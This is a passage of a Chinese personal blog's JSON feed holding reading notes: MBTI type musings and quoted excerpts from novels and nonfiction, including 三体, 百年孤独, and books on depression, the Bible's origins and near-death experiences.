的命令则带有更多的指挥色彩。</p>\n<p>INTP 是 16 型人格中最喜欢 “出世” 的类型，与之相反的 ESFJ 是 16 型人格里最喜欢 “入世” 的类型</p>\n<p>INFP 是最 “柔弱” 的类型，反过来 ESTJ 是最强势的类型，虽然所有 EJ 都是强气场类型，只有 ESTJ 的气场可以用 “霸气侧漏” 来形容，这有时让人觉得很不舒服。</p>\n<p>SP 共性包括如迟到，做事情凭兴趣，时间规划差，不善于抽象思考；但是动手能力相当强，且能够很好的运用身体。NP 的 “大条” 是标志，丢三落四和犯低级错误是家常便饭。</p>\n<p>强 Fi 对愿望的饥渴和迫切，和弱 Te 对实现愿望的无能，组成鲜明的 “求不得”。INFP 会非常渴望拥有 Te 的能力，甚至想 “抄近路” 找一个 Te 为主导功能的伴侣（ESTJ），假装自己性格圆满了。但假借他人实现自我性格圆满终究是假象，这种关系是不平衡的。</p>\n<h2 id=\"四大in自闭人\"><a class=\"markdownIt-Anchor\" href=\"#四大in自闭人\">#</a> 四大 in 自闭人</h2>\n<h3 id=\"intp\"><a class=\"markdownIt-Anchor\" href=\"#intp\">#</a> intp</h3>\n<p>空镜子 终极自在</p>\n<p>解构了自我 取消了意义</p>\n<p>爱的是理想状态的自己 全知全能的镜子</p>\n<p>爱自然 无条件接纳自己并高度共鸣聆听天籁的心灵</p>\n<p>以整体宇宙为核心来思考</p>\n<h3 id=\"intj\"><a class=\"markdownIt-Anchor\" href=\"#intj\">#</a> intj</h3>\n<p>心中有执 拯救自己</p>\n<p>爱的是自己人 安全感</p>\n<p>爱理想中的自己 包容善良坦然释怀的自己</p>\n<p>偏向序列思考与实践</p>\n<h3 id=\"infj\"><a class=\"markdownIt-Anchor\" href=\"#infj\">#</a> infj</h3>\n<p>心中有魔 拯救世人</p>\n<p>爱的是理念人 高度共鸣的同道</p>\n<p>爱通透的自己 深邃到清澈的人</p>\n<p>更重视外界的人性影响与和谐</p>\n<h3 id=\"infp\"><a class=\"markdownIt-Anchor\" href=\"#infp\">#</a> infp</h3>\n<p>心中有花 爱己而爱人</p>\n<p>爱的是恋爱工具 同情心的付出对象</p>\n<p>爱所有人 理解欣赏圣母的人</p>\n<p>以人性共殊相对主体感受为中心思想</p>\n<h3 id=\"心理防御机制\"><a class=\"markdownIt-Anchor\" href=\"#心理防御机制\">#</a> 心理防御机制</h3>\n<p>intp：好蠢，不跟 ta 计较，观察完收集完资料就跑（自负）</p>\n<p>infp：好可怜啊，不要伤害 ta，安慰 ta 一下吧（自恋）</p>\n<p>infj：不要打扰我看时空风暴，我一分神就会掉入时空裂缝，但是不回答又显得没礼貌，言语君子之枢机，还是客套几句再配个官方招牌微笑吧（自闭）</p>\n<p>intj：好蠢，好可怜，不要打扰我，但实在忍不住啊，就真话不全说，假话全不说吧（自负自恋自闭自大）</p>\n<h3 id=\"四种in人之间的区别\"><a class=\"markdownIt-Anchor\" href=\"#四种in人之间的区别\">#</a> 四种 IN 人之间的区别</h3>\n<p>infj 神秘（因为漩涡是其本质），漩涡（通往道体的玄关）；intp 温暖（因为友好最省力），机器（因为空镜子是其本质）。</p>\n<p>infj 行走在时间裂缝，intp 追寻蛛丝马迹而勾勒道体全貌是其乐趣。</p>\n<p>infj 并不是可以隐藏，他们在时空裂缝里走钢丝，一不留神就会掉落。不是故意装作神秘，看到的感觉到的世界不一样，很容易高峰体验、也容易精神分裂。</p>\n<p>intp 敏锐的洞察力和非凡的思维能力帮 infj 导航怎么行走不会跌落。而 intp 非常天真纯粹，在和 infj 说话前已经考虑好怎么才能最好的达到彼此满意的效果，并且不断调适自己的提问方式。</p>\n<p>intp 配 infj：考验配考验。魔王（失衡态）的诡计被佛揭开，佛引导魔安住于空性（终极安全地带），棋逢对手。</p>\n<p>intj 和 infj 之间有高维度共鸣：可惜似道友胜过情侣，亲密关系中互相防范，如能彼此高度信任，也可以成为完美道侣。</p>\n<p>本能吸引：intp／infj，infp／intj。这两对之间做自己就能彼此吸引。四种 in 同类型之间匹配，可能会加重病情，四种 in 都有病，intp／infp 回避，intj／infj 分裂。</p>\n<p>intp 是最好的心智结构；infj 思维混乱，intj 急功近利；infp 偏安一隅；而 en 沉不下心。</p>\n",
            "tags": [
                "MBTI"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2019/07/01/BOOK/11%E3%80%8A%E9%98%BF%E5%BC%A5%E9%99%80%E4%BD%9B%E4%B9%88%E4%B9%88%E5%93%92%E3%80%8B%E5%A4%A7%E5%86%B0/",
            "url": "http://www.n1h1l157.live/2019/07/01/BOOK/11%E3%80%8A%E9%98%BF%E5%BC%A5%E9%99%80%E4%BD%9B%E4%B9%88%E4%B9%88%E5%93%92%E3%80%8B%E5%A4%A7%E5%86%B0/",
            "title": "《阿弥陀佛么么哒》大冰",
            "date_published": "2019-06-30T16:00:00.000Z",
            "content_html": "<p>其实，若事情再来一次，我想我依旧会沉默，依旧会无所作为。</p>\n<h3 id=\"2-123\"><a class=\"markdownIt-Anchor\" href=\"#2-123\">#</a> 2-123</h3>\n<p>总有一些朋友，不是人脉关系，不是交换关系，只是朋友而已。</p>\n<p>社交之所以有时候会让人觉得烦，大多是因为，社交中的人们大都在努力表现着自己所不具备的优良品质。盔甲太重，人自然累。</p>\n<p>任何一种长期单一模式的生活，都是对自己犯罪。</p>\n<p>明知有多项选择的权利却不去主张，更是错上加错。</p>\n<p>你们帮我规划的人生我认真体验过了，现在我想去体验一下其他的生活。</p>\n<p>我还年轻，需要抓紧时间去体验这个世界，我不会浪费生命，我会对自己负责的。</p>\n<p>他们一起走过星河，踏过瀑布，踩过无数个海滨，他和她的爱情生长在山河湖海边，开在旅途中。</p>\n<p>人生是一场不断校正方向的旅行，有人找到的方向是事业，有人找到的是信仰，有人找到的是爱…… 我们可以旅行，但不能没有方向。</p>\n<p>重要的是，你是否有能力去喜欢，是否有尽力去触碰，是否有定力去坚守，是否有魄力去取舍，是否有权利去选择。</p>\n<p>喜欢就好好喜欢，别把执着当认真，放弃当放下，随意当随缘。</p>\n<p>多数人在二三十岁就死了，他们变成自己的影子，往后的生命不过是不断的重复自己。</p>\n<h3 id=\"2-124\"><a class=\"markdownIt-Anchor\" href=\"#2-124\">#</a> 2-124</h3>\n<p>有些难过，难得难以言说，他没和任何人诉说。</p>\n<p>不停地说服自己，又不停的后悔，潮起潮落，每天都是世界末日。</p>\n<p>女人看男人，一般看他的社会属性；男人看女人，一般看她的自然属性。</p>\n<p>你知道吗？走遍了大半个地球，才明白 “担心” 两个字多么弥足珍贵。</p>\n<p>每一个拥有梦想的人都值得被尊重。可我觉得，除了被尊重，人还需要自我尊重。梦想不等于理想。光幻想光做梦不行动，叫梦想。敢于奔跑起来的梦想，才叫理想。</p>\n<p>不是所有坏人生下来就是坏人，有些是被生活逼的。</p>\n<p>世人大都是普通人，大部分普通人大豆信步慢行在普普通通的人生中。大部分普通人，大都习惯了在周遭旁人林林总总的故事中扮演路人甲。</p>\n<p>在我们身处的这个次元，事物大都是螺旋状抛物线式矢量前行，起起伏伏兜兜转转直到终点，永没有恒久的巅峰或低谷。</p>\n<p>几乎在一瞬间，她毫无保留的爱上了这个未曾谋面的小生命，过去和未来所有的一切都有了意义，这个孩子就是她存在的意义。</p>\n<p>每个女人一生中终归会有那么几个瞬间，母性如一场不期而至的急雨春霖，须臾润了整个世界。</p>\n<p>其实，若事情再来一次，我想我依旧会沉默，依旧会无所作为。</p>\n<p>这种无能为力的感觉，让我心慌。</p>\n<p>所谓朋友，不过是我在路上走着，遇到了你，大家点头微笑，结伴一程。缘深缘浅，缘聚缘散，该分手时分手，该重逢时重逢。惜缘即可，不必攀缘。同路人而已。最大的幸运莫过于彼此陪伴着。</p>\n",
            "tags": [
                "人生",
                "成长"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2019/07/01/BOOK/12%E3%80%8A%E4%B8%89%E4%BD%93%E3%80%8B%E5%88%98%E6%85%88%E6%AC%A3/",
            "url": "http://www.n1h1l157.live/2019/07/01/BOOK/12%E3%80%8A%E4%B8%89%E4%BD%93%E3%80%8B%E5%88%98%E6%85%88%E6%AC%A3/",
            "title": "《三体》刘慈欣",
            "date_published": "2019-06-30T16:00:00.000Z",
            "content_html": "<p>对于更强大的存在来说，我们做的一切都丝毫没有意义，我们只是做自己想做的事。</p>\n<h3 id=\"2-124\"><a class=\"markdownIt-Anchor\" href=\"#2-124\">#</a> 2-124</h3>\n<p>试图用科学的方法找出科学的局限性，试图确定科学对自然界的认知在深度和精度上是否存在一条底线…… 底线之下是科学进入不了的。现在物理学的发展，似乎隐隐约约地触到了这条底线。</p>\n<p>她像一颗星星，总是那么遥远，照到我身上的光总是冷的。</p>\n<p>在中国，任何超脱，飞扬的思想都会怦然坠地的，现实的引力太沉重了。</p>\n<h3 id=\"2-125\"><a class=\"markdownIt-Anchor\" href=\"#2-125\">#</a> 2-125</h3>\n<p>也许，人类和邪恶的关系，就是大洋与漂浮于其上的冰山的关系，它们其实是同一种物质组成的巨大水体，冰山之所以被醒目的认出来，只是由于其形态不同而已，而它实质上只不过是着整个巨大水体中极小的一部分…… 人类真正的道德自觉是不可能的，就像他们不可能拔着自己的头发离开大地。要做到这一点，只有借助于人类之外的力量。</p>\n<p>对于现实，她什么都不想说，也没什么可说的了。</p>\n<p>现在除了死后不知是否存在的另一个世界，她最想去的地方就是这样与世隔绝的峰顶了，在这里，她有一种久违的安全感。</p>\n<p>工作是一种有效的麻醉剂，投身于其中，就暂时躲开了那噩梦般的困扰。</p>\n<p>夜深人静的时候，从耳机中听着来自宇宙没有生命的嗓音，这噪声隐隐约约的，好像比那些星星还永恒，有时又觉得那声音像大兴安岭的冬天里没完没了的寒风，让我感到很冷，那种孤独真的没法形容。</p>\n<p>它悬在那里，永远不会做丝毫的运动，永远不会有丝毫的变化，真是对死亡最到位的诠释。</p>\n<p>人类社会已经无力进行自我完善，需要一个外部力量的介入。</p>\n<p>她首先面临的，是一种奉献目标的丧失，她曾是一个理想主义者，需要将自己的才华贡献给一个伟大的目标，现在却发现，自己以前做的一切全无意义，以后也不可能有什么有意义的追求。</p>\n<p>这条无限长的曲线就是宇宙的抽象，一头连着无限的过去，另一头连着无限的未来，中间只有无规律无生命的随机起伏，一个个高低错落的波峰就像一粒粒大小不等的沙子，整条曲线就像是所有沙粒捧成行形成的一堆沙漠，荒凉寂寥，长得更令人无法忍受。你可以沿着它向前向后走无限远，但永远找不到归宿。</p>\n<p>对于更强大的存在来说，我们做的一切都丝毫没有意义，我们只是做自己想做的事。</p>\n<p>我找到了能够为之献身的事业，付出的代价，不管是自己的，还是别人的，都不在乎。同时我也知道，全人类都将为这个事业付出史无前例的巨大牺牲，这仅仅是一个微不足道的开始。</p>\n<p>人类不需要救世主，事实上他们现在过得比应得的好多了。</p>\n<h3 id=\"2-126\"><a class=\"markdownIt-Anchor\" href=\"#2-126\">#</a> 2-126</h3>\n<p>这就是文明的旅游规则，首先要保证人类的生存和他们舒适的生活，其余的都是第二位的。</p>\n<p>生物平等不可能实现。人类只要生存下去，这种平等就不可能出现。</p>\n<p>一个高尚的人，一个纯粹的人，一个有道德的人，一个脱离了低级趣味的人。</p>\n<p>不管有没有意义，我不能停下来，停下来我会崩溃的。</p>\n<p>整个人类本质都一样，只要文明像这样发展，我想拯救的这种燕子，还有其他的燕子，迟早都会灭绝，只是时间问题。</p>\n<p>文明仍按照自己的轨迹毁灭着地球上除人之外的其他生命。</p>\n<p>我们不知道外星文明是什么样子，但知道人类。</p>\n<p>上帝很吝啬，在创世大爆炸中只给了宏观宇宙三个纬度，但这不等于更高的纬度不存在，有多达八个纬度被禁锢在微观中，加上宏观的三维，在基本粒子中，存在着十一纬的空间。</p>\n<p>一切都是为了文明的生存，为了整个文明的生存，对个体的尊重几乎不存在，个人不能工作就得死。</p>\n<p>我是个小人物，生活在社会的最底层，没有人会注意到我，孤独一生，没有财富没有地位没有爱情，也没有希望。</p>\n<p>碑是那么小，与其说是为了纪念，更像是为了忘却。</p>\n",
            "tags": [
                "生命"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2019/07/01/BOOK/14%E3%80%8A%E4%B8%8E%E6%8A%91%E9%83%81%E7%97%87%E7%9B%B8%E4%BC%B4%E7%9A%84%E6%97%A5%E5%AD%90%E3%80%8B%E9%A9%AC%E4%BF%AE/",
            "url": "http://www.n1h1l157.live/2019/07/01/BOOK/14%E3%80%8A%E4%B8%8E%E6%8A%91%E9%83%81%E7%97%87%E7%9B%B8%E4%BC%B4%E7%9A%84%E6%97%A5%E5%AD%90%E3%80%8B%E9%A9%AC%E4%BF%AE/",
            "title": "《与抑郁症相伴的日子》马修",
            "date_published": "2019-06-30T16:00:00.000Z",
            "content_html": "<p>我的心一片荒芜，以往的激情一去不返。当我醒来，看到灰暗的黎明。</p>\n<h3 id=\"3-1\"><a class=\"markdownIt-Anchor\" href=\"#3-1\">#</a> 3-1</h3>\n<p>在黑狗的魔力下，我不再是过去的自己。我的心一片荒芜，以往的激情一去不返。当我醒来，看到灰暗的黎明。回头看看，黑狗时常在我的人生里出没，每当他来时，空虚随之降临，人生的色彩也暗淡了下来……</p>\n<p>黑狗每次来拜访我时，总会让我出乎意料，没有什么显而易见的原因或事件预告它的到来。它来访时，我看起来会更加苍老。它来访时，我只能戴着 “黑狗” 眼镜看世界。它来访时，往日为我带来欢愉的那些美妙时刻也消失不见。</p>\n<p>黑狗以破坏我的胃口为乐，并对吞噬我的记忆力和注意力乐此不疲。在黑狗的陪伴下，处理任何事情，造访任何地方，都备感艰辛。它总是像追兔子一样把我的信心赶跑。它最不希望别人注意到我，也不喜欢听到别人评判我。</p>\n<p>我有一只黑狗，这让我羞愧难当，工作中，生活中，我被迫做了 “说谎大王”。这些 “谎言” 耗尽了我的精力，并不亚于对抗任何重大的身体疾病所付出的艰辛。黑狗让我说的话都是灰色的，它让我的声音微弱并缺乏说服力。</p>\n<p>黑狗让我变得易怒而难于相处，夺走我爱的能力，埋葬我的亲密关系，黑狗对这一切根本不以为意。它总反反复复对我唱起 “夜半歌声”。生命中有一只黑狗存在，它不仅让我感觉低落，悲伤和忧郁，更可怕的是，它让我完全丧失感觉。天长日久，黑狗越长越大，在我的生命中无处不在。我虽想尽办法把它赶跑，但结果却总是更糟。</p>\n<p>我会自己找些药来吃，却发现没有什么帮助。我渐渐远离了所有的人，所有的事，他让我屈从，让我对生活低下了头，让我想到了放弃……</p>\n<p>开始治疗让我迈出了恢复的第一步。把黑狗从自己的心里拉出来溜溜，绝对比把它圈在心里强。要学会不再惧怕黑狗，更要学会驯服它的技巧。压力和疲劳是它最喜欢的狗粮，它吃得越欢，叫得越响！找到适合自己的放松之道，瑜伽，冥想，亲近大自然，这些都能帮我远离黑狗。</p>\n<h3 id=\"3-2\"><a class=\"markdownIt-Anchor\" href=\"#3-2\">#</a> 3-2</h3>\n<p>黑狗喜欢和我一起窝在床上，让我自暴自弃。黑狗讨厌运动和锻炼，因为它知道，一旦我迈出了第一步，就会把它甩的越来越远。有黑狗相伴的日子说不上好，但的确有得有失，它迫使我重新评估和简化自己的生活，它教会我感谢和拥抱面对的难题。</p>\n<p>黑狗也会永远成为我生活的一部分，但我确信，我的耐心，幽默，智慧和经受的历练，让我足以应付这世界上最凶猛的黑狗。</p>\n<p>黑狗不在了，一半的记忆也不在了；我不在了，那么所有的记忆都将不在了。是的，黑狗，我想，我一直用自己的方式忠诚的爱你。</p>\n<p>有些事，你可能注意到了，它的眼中失去了曾经钻石般的光亮。它看上去被深深的疲惫感彻底压倒了，没完没了的沉睡也无法帮他恢复生机。他的 “活力” 很难被点燃，他看起来渐渐颓废，邋遢的外表，糟糕的记性，对他来说已是常态。笑容也难以绽放，工作总是不能按时完成，借口和病假条却常伴左右。</p>\n<p>他习惯于远离社交活动。变得异常敏感，变得容易哭泣。即使已经精疲力竭，也不知如何放松下来。“鸡蛋里头挑骨头” 成了习惯。为了一点小事就怒气冲天，对爱和紧密竖起一道屏障。希望和他人保持距离，更愿意自己独处。常常喝个烂醉，总是对生活抱怨个没完。总是空想存在解决一切问题的 “万全之策”。</p>\n<p>强迫他接受生活是美好的，这么做没有意义，只会让他更烦恼。当头棒喝也无济于事。没有人不希望远离抑郁、振作起来。你知道问题出在他的头脑里，但请别这样对他说。在他还没准备好的时候，指责毫无用处。抑郁是一种病症，而非软弱无力的表现。别自以为是的给出毫无根据的建议。善解人意，体贴入微没什么不好，但这些举动会让他自我感觉更糟。</p>\n<h3 id=\"3-3\"><a class=\"markdownIt-Anchor\" href=\"#3-3\">#</a> 3-3</h3>\n<p>请别给他扣上 “博取关注” 的帽子，这会贬低和刺伤他。他并非在博取关注，但他确实需要关注。请别刻意指出这世上比他悲苦的人还有千千万，这只会加深他的负罪感和无力感。请别强迫他做他不想做的事，也不要替他的行为编织借口，这只会让他变得更加绝望，更加远离生活。</p>\n<p>请小心触碰他的内心，也许他还没有做好交谈的准备。告诉他，你想交谈只是因为你很在乎他。如果你想向他传递一些有用的帮助信息，请尽量做的不着痕迹。试着只倾听不评论，这是你能给他最好的礼物。帮助和陪伴是巨大的安慰和鼓舞。固定的日常安排对他重建自尊，自信非常重要。坚持日常锻炼可以有效的削弱黑狗的力量。通过简化的生活和工作，压力越小，抑郁越少。</p>\n<p>不与黑狗达成和解，他付出的代价将会是婚姻，友情，工作以及生命本身。抑郁是因为脑部的化学物质失衡导致的，有时候需要药物帮助治疗。但有时只需通过一些自然疗法就可以有效的缓解症状。</p>\n<p>承受愤怒，批评，消极，冷漠这些负面情绪对任何人都不容易，但请千万不要被这些情绪所影响。这些都只是抑郁黑狗的吠叫，不是他那个人的本性。对付困境，冷静从容是最好的武器。如果你感到生命的坡度让你步履维艰，试着想象一下，那封顶的美景。</p>\n",
            "tags": [
                "成长",
                "意义"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2019/07/01/BOOK/15%E3%80%8A%E5%9C%A3%E7%BB%8F%E6%98%AF%E6%80%8E%E6%A0%B7%E5%86%99%E6%88%90%E7%9A%84%E3%80%8B%E5%BA%B7%E8%AF%BA%E5%88%A9/",
            "url": "http://www.n1h1l157.live/2019/07/01/BOOK/15%E3%80%8A%E5%9C%A3%E7%BB%8F%E6%98%AF%E6%80%8E%E6%A0%B7%E5%86%99%E6%88%90%E7%9A%84%E3%80%8B%E5%BA%B7%E8%AF%BA%E5%88%A9/",
            "title": "《圣经是怎样写成的》康诺利",
            "date_published": "2019-06-30T16:00:00.000Z",
            "content_html": "<p>当撒旦犯罪时，神就给他一个身体，然后把他赶出天堂。撒旦就创造了这个世界，结果，所有的物质从本质上讲都是邪恶的。</p>\n<h3 id=\"3-7\"><a class=\"markdownIt-Anchor\" href=\"#3-7\">#</a> 3-7</h3>\n<p>教会与国家的联合从来不是以教会的基督化，而是教会的世俗化。</p>\n<p>无谓意味着无知，伴随着无知的是迷信。</p>\n<p>当撒旦犯罪时，神就给他一个身体，然后把他赶出天堂。撒旦就创造了这个世界，结果，所有的物质从本质上讲都是邪恶的。</p>\n<h3 id=\"3-8\"><a class=\"markdownIt-Anchor\" href=\"#3-8\">#</a> 3-8</h3>\n<p>正确的就是正确的，错误的就是错误的。正确的终究会得胜。怀疑就是不忠，犹豫就是犯罪。</p>\n<p>我不敬拜基督在其上受难的十字架，我敬拜在十字架上受难的基督。</p>\n<p>我不需要你们的赦免，我只需要神的赦免。</p>\n<p>国家这个身体只能有一个头，这个头必须是国王，而教会只能是手臂。</p>\n<p>这本书开始只是讲一个人，这个人在照看着一个在旷野里漂泊的小小民族。他想给他们提供一部道德法典，以此来规范他们的生活。</p>\n<p>迫害让给了物质主义，慢慢的都变质了，情欲、贪婪、腐败、现实主义，泛滥成灾。</p>\n",
            "tags": [
                "神学"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2019/07/01/BOOK/16%E3%80%8A%E6%BF%92%E6%AD%BB%E7%BB%8F%E5%8E%86%E3%80%8B%E7%8E%9B%E4%B8%BD%E8%90%A8/",
            "url": "http://www.n1h1l157.live/2019/07/01/BOOK/16%E3%80%8A%E6%BF%92%E6%AD%BB%E7%BB%8F%E5%8E%86%E3%80%8B%E7%8E%9B%E4%B8%BD%E8%90%A8/",
            "title": "《濒死经历》玛丽萨",
            "date_published": "2019-06-30T16:00:00.000Z",
            "content_html": "<p>任何概括性的说法都只能认为是极端的假设。</p>\n<h3 id=\"3-8\"><a class=\"markdownIt-Anchor\" href=\"#3-8\">#</a> 3-8</h3>\n<p>科学家认为，大脑只是影响深远却又看不见摸不着的思维的接受和传送器。</p>\n<p>死亡为尚未被发现的国度，去那儿的旅行者皆一去不返。</p>\n<p>有好多天，我都打不起精神，因为我又回到了这一沉重、灰暗和枯燥的世界，而我本来可以死去的。如果现在就能够选择，任何时候我都会选择死亡。</p>\n<p>成千上万的人的贫困不堪的生活只是万劫不复的可怕的生活序曲，是炼狱。</p>\n<p>当前的人间就是炼狱，而死后才是极乐世界，只有死得其所才能到达那里，最好是殉道者般焚烧升天。</p>\n<p>洞穴曾被认为是起源之地，也许因为他们向来都是黑暗的。常常是恶意产生于人们的想象中，在黑暗中进入噩梦的境地。</p>\n<p>它是无法用言辞来形容的，我所说的一切都是不完全的，我不想把它用语言表达出来，因为那样会玷污我的记忆。</p>\n<p>我们的真我只是通过一根细线附在身体上，断了没有什么可怕的。</p>\n<p>很久以来，许多人都相信灵魂会在我们熟睡时自动脱离身体，我们所记得的零星的梦境只是真实的脱离肉体经历的一部分。</p>\n<p>有人认为梦的产生时因为睡眠时人脑中的化学变化，像放电影一样，放血随机的无意义的图像，使头脑准备另一天的需要。</p>\n<h3 id=\"3-9\"><a class=\"markdownIt-Anchor\" href=\"#3-9\">#</a> 3-9</h3>\n<p>梦也许不是一种介质，他是活人之间创造出的一种心灵感应空间。</p>\n<p>它是一种非物质的环境，与其运动法则，一切与物质世界的关联很遥远。其深度和广度是有限的世界所无法理解的。</p>\n<p>他们有自己的灵魂，有自己的生存目的。</p>\n<p>死没什么，我知道我随时可能死去，所以我每天都要好好的活着。我会对那些濒临死亡的人说。别害怕，那是个美好的地方。</p>\n<p>信奉不同的宗教与支持不同的足球队相类似，不管他们选择哪只球队，哪种宗教，比赛都是一样的。</p>\n<p>任何概括性的说法都只能认为是极端的假设。</p>\n<p>你在地球上所做的一切得到的报偿便是死亡。</p>\n<p>我不知道他们是什么，但他们都很疲惫，呆滞悲哀。他们似乎要拖着沉重的步伐永远走下去，不知道要去哪里，不知道要跟谁走，也不知道再寻找什么。</p>\n<p>这些悲伤的人即使走路时也从不抬头。他们申请淡漠，新来的人丝毫也勾不起他们的好奇心，他们自己也米有一点要改变这种惨淡命运的意思。</p>\n<p>在那个绝望的世界里，他们自己也不知道在寻找什么。所有的希望，动力和意志都早已消磨殆尽。压抑和绝望的感觉深切而持久。</p>\n<p>这是个文人问津的角落，在这里一切都已被遗忘，任其腐朽溃烂。</p>\n<p>每个自杀者都发现，他们试图通过 “结束一切” 来逃避的问题与矛盾，在灵魂脱离了躯体的时候不但没有消失，反而常常是以一种更原始、更可怕、更直接的形式存在着。他们过早的想要从定数–实现某个生活目标，并从中解脱出来，因此” 违反了规则 “，而受到的惩罚。</p>\n<p>他们对我的死竟毫不在意，根本就没有人在意…… 对他们来说，我只是堆令人作呕的臭肉。</p>\n<h3 id=\"3-10\"><a class=\"markdownIt-Anchor\" href=\"#3-10\">#</a> 3-10</h3>\n<p>一种解释为：濒死经历在大脑停止活动时还尚未发生。它也许只是个体在醒来那一瞬间所做的格外真切的一个梦（尽管个体可能觉得过了很长时间）。</p>\n<p>思想与大脑是两回事，意识并不依赖于量性的大脑活动而存在。</p>\n<p>一个充满愤怒、绝望、痴迷的灵魂的地方。他们把自己关在自己意识创造的世界里，固执的认为自己的命该如此。</p>\n<p>即使是天使和恶魔，也曾经在地球上生活过。后生命世界与我们这个物质世界共存，只是看不见罢了。死亡只是一种状态的变化。</p>\n<p>他们唯一的愿望就是从这个世界上消失，摆脱烦恼。然而，他们却发现自己来到了一个诡异的世界，对于身边的一切反而更清晰，感情上的事也更加敏感。</p>\n<p>我们所面临的是彻底毁灭，而这时我们就像低级动物一样生生死死，毫无意识，毫无想象力，也毫无精神感知力。</p>\n<p>我们不知道的东西要比知道的东西多的多。科学就像巨大的黑洞中的一道强光。</p>\n<p>左脑的感知能力把我们自己与其他人联系起来，因为它使我们每个人以相同的客观方式看事情，促使” 现实 “保持一致。如果这个世界真如许多宗教教义所说的只是个幻象，那么左脑便能使这个幻象持久。这样，身为这世界的一部分，我们也就能以同种方式看这个世界了。</p>\n<p>人格的改变–尤其是长期的改变–几乎总是伴随着大脑组成结构的改变。</p>\n<p>地球上的一切在天上都有其对应物，反之亦然。</p>\n<p>灵魂的每一次显现，都要有一个物质出口或者反应。</p>\n<p>大脑一旦死去，化为尘土，个性便不复存在。</p>\n<p>我们每个人都有灵魂，它不会随肉体的死亡而消亡，他可以超越凡俗肉体存在。</p>\n<p>人有若干个自我，或者说方面，有一个主我，即总体之和…… 这些自我只有在高水平上才能实现灵魂地统一。</p>\n<p>显而易见，他把我以今为止仍认为很重要的俗世生活，只看作是一种准备，只是我在这儿要做的真正工作的序曲。</p>\n<h3 id=\"3-11\"><a class=\"markdownIt-Anchor\" href=\"#3-11\">#</a> 3-11</h3>\n<p>我们死时丢掉了肉体的皮囊，意识可能就会以一个永无止境的梦的形式存在。</p>\n<p>生命是意义塑造的，在这个世界里，想象即存在。</p>\n<p>或许临近死亡，就会激起我们大脑中的某种视觉程序，将心理上的创痛转化为某种无法描述的让人高兴的事情。</p>\n<p>难道你还不清楚自己就是神明吗？</p>\n<p>生命的彼岸–那是黑暗的太虚，还是充满光明的城市？</p>\n<hr>\n",
            "tags": [
                "生命",
                "神学"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2019/07/01/BOOK/17%E3%80%8A%E7%99%BE%E5%B9%B4%E5%AD%A4%E7%8B%AC%E3%80%8B%E9%A9%AC%E5%B0%94%E5%8A%A0%E6%96%AF/",
            "url": "http://www.n1h1l157.live/2019/07/01/BOOK/17%E3%80%8A%E7%99%BE%E5%B9%B4%E5%AD%A4%E7%8B%AC%E3%80%8B%E9%A9%AC%E5%B0%94%E5%8A%A0%E6%96%AF/",
            "title": "《百年孤独》马尔加斯",
            "date_published": "2019-06-30T16:00:00.000Z",
            "content_html": "<p>照他的天性，他将注定成为谨慎内向，落落寡合的人，喜欢一个人沉思默想。</p>\n<h3 id=\"3-11\"><a class=\"markdownIt-Anchor\" href=\"#3-11\">#</a> 3-11</h3>\n<p>政客们的虚伪，统治者们的残忍，民众的盲从和不觉悟。</p>\n<p>孤独造成了愚昧，落后，保守，僵化的现象，孤独 —— 一种因为不能掌握自身命运而产生的绝望、冷漠和疏远感。这种孤独感不仅弥漫在布恩迪亚家和马贡多镇，而且渗入了民族的精神。</p>\n<p>当失眠症在马贡多传布时，人们白日做梦并能看到别人梦里的景象，最后竟集体丧失记忆。</p>\n<p>远征队的人们致身于这个原罪之前就已存在的，潮湿而寂静的天堂之中。</p>\n<p>他觉得再也受不了腰里冰冷的寒气和肚子里的空气，受不了那种恐惧，也受不了那既想逃走又像永远留在那恼人的寂静和可怕的孤独之中的，缺乏理智的渴望。</p>\n<p>他们甚至怀疑，爱情可以是一种比他们夜间幽会时放纵不羁但瞬息即逝的幸福更平静、更深沉的感情。</p>\n<p>消失了半年，乌苏拉回到了家。然而，她却没有分享任何事情。只是像平常一样。</p>\n<p>失眠症最可怕的地方还不在于使人毫无倦意不能入眠，病症无情，发展到后来会出现最危急的症状，会失去记忆。就是说，一旦患者习惯于昼夜不眠，就开始从记忆中抹去童年的印象，然后会忘掉事物的名称和概念，最后会认不出人，甚至失去自我意识，变成一个没有过去的白痴。</p>\n<h3 id=\"3-12\"><a class=\"markdownIt-Anchor\" href=\"#3-12\">#</a> 3-12</h3>\n<p>她用乌头煎汤让大家喝，但没有能使大家睡着，却使他们整天睁着眼睛做梦。在这种幻觉状态中，人们不仅能看到自己梦中的形象，还能互相看到别人梦中的形象，就仿佛家里到处都是客人似的。</p>\n<p>有的人想睡觉，但不是因为困倦，而是出于对睡眠的怀念，他们为此想尽了一切办法。人们聚集在一起无休止的闲聊，一连几个小时重复同一个笑话。</p>\n<p>后来人们对这种紧急状态也习以为常了，他们照常安排生活，劳动也恢复了原来的节奏，谁也不再为那无用的睡眠习惯发愁了。</p>\n<p>他们就这样在一种难以把握的现实中活着，这现实暂时被文字挽留着，可是一旦人们忘记了文字的意义，它就会逃走，谁也奈何不了它。</p>\n<p>知道自己被遗忘了，这遗忘不是那种可以弥合的感情上的疏远，而是另一种他很熟悉的，更加无情的、无法挽留的遗忘 — 死的遗忘。</p>\n<p>时光的流逝消除了他心中轻率的念头，但那种失望的感觉却更加的强烈了。他埋头工作，甘愿打一辈子光棍，免得为自己的无能而羞愧。</p>\n<p>他只能用想象来填补自己可怕的寂寞，只有在想象之中，他才能看到她的倩影。</p>\n<p>她等呀等，等的都厌烦了，等得皮肤都起了皱纹，乳房干瘪了，连狂乱的心也熄灭了。</p>\n<p>他们之间的恋爱关系便无限期的持续下去，成了谁也不去关心的倦怠了的爱情。</p>\n<p>不清楚他是怎样把那些微妙而确凿的偶然事件联系起来，逐渐得出这么个结论的。雷梅泰斯的死并没有引起他一直担心的震惊。确切的说，只是产生了一种慢慢消融在孤寂和消极的失望之中的无声愤慨，类似过去他甘愿过没有女人陪伴的生活时所体验过的情感。</p>\n<p>他不拔不动的性格和定了型的孤独天性使他成了毫无前途的多愁善感者。</p>\n<p>没人知道他如何徒劳的研究死者的手稿，极力向重温与他一起生活的日子。</p>\n<p>她有一种罕见的本领，除非正巧碰上好机会，她会完全像不存在似的。</p>\n<h3 id=\"3-13\"><a class=\"markdownIt-Anchor\" 